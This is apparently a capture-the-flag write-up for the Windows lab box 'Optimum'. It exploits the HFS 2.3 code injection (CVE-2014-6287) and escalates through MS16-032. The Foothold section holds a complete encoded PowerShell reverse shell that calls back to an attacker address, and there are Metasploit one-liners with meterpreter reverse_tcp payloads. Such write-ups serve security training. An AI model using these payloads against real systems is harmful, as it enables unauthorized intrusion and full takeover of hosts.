## Overview

Optimum is an Easy Windows box that exposes exactly one service: Rejetto HttpFileServer (HFS) 2.3 on port 80. That version has an unauthenticated remote-code-execution flaw ([CVE-2014-6287](https://nvd.nist.gov/vuln/detail/CVE-2014-6287)) that gives a foothold as the user `kostas`. The host is a Windows Server 2012 R2 install frozen at a late-2014 patch level, so the missing MS16-032 update ([CVE-2016-0099](https://nvd.nist.gov/vuln/detail/CVE-2016-0099)) escalates straight to `NT AUTHORITY\SYSTEM`.

## Recon

| Port | Service | Version |
|------|---------|---------|
| 80/tcp | http | HttpFileServer httpd 2.3 (HFS 2.3) |

A full port sweep confirmed port 80 was the only thing open. The server banner immediately flags the exact product and version, which is enough to pick the exploit.

```bash
nmap -sC -sV -Pn 10.129.35.218
nmap -p- --min-rate 3000 -Pn 10.129.35.218
curl -s -I http://10.129.35.218/          # Server: HFS 2.3
```

## Enumeration

HFS 2.3 is the classic Rejetto build vulnerable to [CVE-2014-6287](https://nvd.nist.gov/vuln/detail/CVE-2014-6287). The bug is a [code injection](https://cwe.mitre.org/data/definitions/94.html): a null byte (`%00`) in the `search` parameter cuts short the internal search regex, and everything after the null byte is evaluated by HFS's template-macro engine. The `{.exec|...}` macro runs OS commands as the HFS process user — no authentication required.

## Foothold

The one catch: HFS's macro parser treats `.`, `|`, `/`, and `:` as special characters, so a plaintext command containing paths or URLs silently fails. Encoding the payload as a Base64/UTF-16LE PowerShell command (`powershell -enc`) sidesteps every one of those characters, because the Base64 alphabet doesn't contain them.

Start a listener, then build and fire the encoded reverse shell through the search box:

```bash
nc -l -v -p 443
```

```bash
PS='$c=New-Object System.Net.Sockets.TCPClient("10.10.16.13",443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r+"PS "+(pwd).Path+"> ");$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()'
B64=$(echo -n "$PS" | iconv -t UTF-16LE | base64 -w0)
curl -s "http://10.129.35.218/?search=%00{.exec|powershell -nop -w hidden -enc $B64.}"
```

A reverse shell lands as `optimum\kostas`. If the manual encoding is fiddly, the Metasploit module handles the whole delivery reliably:

```bash
msfconsole -q -x 'use exploit/windows/http/rejetto_hfs_exec; set RHOSTS 10.129.35.218; set RPORT 80; set SRVHOST 10.10.16.13; set LHOST 10.10.16.13; set LPORT 5555; set payload windows/meterpreter/reverse_tcp; exploit'
```

## Privilege Escalation

`systeminfo` shows Windows Server 2012 R2 (build 9600) with its last hotfix at KB3014442 — no 2016 patches, so MS16-032 is missing. [CVE-2016-0099](https://nvd.nist.gov/vuln/detail/CVE-2016-0099) is a [race condition](https://cwe.mitre.org/data/definitions/362.html) in the Secondary Logon service (`seclogon`) that leaks a privileged thread handle; a low-privilege user races to duplicate it and steal a SYSTEM token — an [improper privilege management](https://cwe.mitre.org/data/definitions/269.html) failure.

```bash
systeminfo
```

The FuzzySecurity PowerShell PoC repeatedly failed with `No valid thread handle was captured` from the 32-bit reverse-shell host. Metasploit's local module, driven from the Meterpreter session, won the handle race cleanly:

```bash
msfconsole -q -x 'use exploit/windows/local/ms16_032_secondary_logon_handle_privesc; set SESSION 1; set LHOST 10.10.16.13; set LPORT 6666; set payload windows/meterpreter/reverse_tcp; exploit'
```

Success prints `Holy handle leak Batman, we have a SYSTEM shell!!` and opens a new session as `NT AUTHORITY\SYSTEM`. The technique needs at least two logical CPUs.

## Root flag

```bash

```

Full compromise — SYSTEM on the host.
